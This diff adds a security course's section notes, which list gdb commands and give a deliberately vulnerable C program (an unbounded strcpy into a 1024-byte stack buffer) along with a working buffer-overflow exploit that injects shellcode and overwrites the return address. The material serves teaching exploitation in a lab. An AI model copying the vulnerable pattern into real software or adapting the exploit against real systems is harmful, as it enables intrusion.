@@ -1,0 +1,81 @@
+
+Section Materials
+I know section went by quickly, hopefully seeing the whole process was helpful. 
+ 
+I used a number of gdb commands, as well as the "gdb -e sploitN -s /tmp/targetN" syntax for calling gdb.
+There are many other useful gdb commands, these are just the ones you saw me using (this is all of them!)
+> r     == run              (starts running the program)
+> c     == continue         (continues the program until the next breakpoint, exit, or crash)
+> stepi == stepi            (runs the next single instruction)
+> i r   == info registers   (shows the values of all registers)
+> b     == break [location] (sets a breakpoint at a location, either a name or address)
+> disas == disassemble      (shows the disassembly of the current function, may not work while running shellcode!)
+> print    prints the value of a math operation or symbol (useful for calculating offsets)
+> x \FMT LOCATION  examines a location ($register or 0xaddress) with the given format
+FMTs:
+Nx show N 4-byte values in hex format
+s  show this location as if it were a '\0' terminated C string
+Ni show N x86 asm instructions 
+This was the exact version of target1.c I was using (this will be slightly different from your version of target1)
+ 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int bar(char *arg, char *out)
+{
+  strcpy(out, arg);
+  return 0;
+}
+
+int foo(char *argv[])
+{
+  char buf[1024];
+  bar(argv[1], buf);
+}
+int main(int argc, char *argv[])
+{
+  if (argc != 2)
+    {
+      fprintf(stderr, "target1: argc != 2\n");
+      exit(EXIT_FAILURE);
+    }
+  foo(argv);
+  return 0;
+}
+And this was the sploit1.c I ended up with at the end of section. This is far from the only way to exploit the above program, but it is one way. It should not work for *your* copy of target1 (don't turn this in!)
+ 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include "shellcode.h"
+
+#define TARGET "/tmp/target1"
+
+int main(void)
+{
+  char *args[3];
+  char *env[1];
+
+  args[1] = malloc(4096);
+  int i = 0;
+  memset(args[1],'a',4096);
+  for(i=0;i<strlen(shellcode);i++){
+   args[1][i] = shellcode[i];
+  }
+  args[1][1036] = 0x40;
+  args[1][1037] = 0xea;
+  args[1][1038] = 0xff;
+  args[1][1039] = 0xbf;
+
+  args[0] = TARGET; args[2] = NULL;
+  env[0] = NULL;
+
+  if (0 > execve(TARGET, args, env))
+    fprintf(stderr, "execve failed.\n");
+
+  return 0;
+}
+ 
+Good luck everyone!
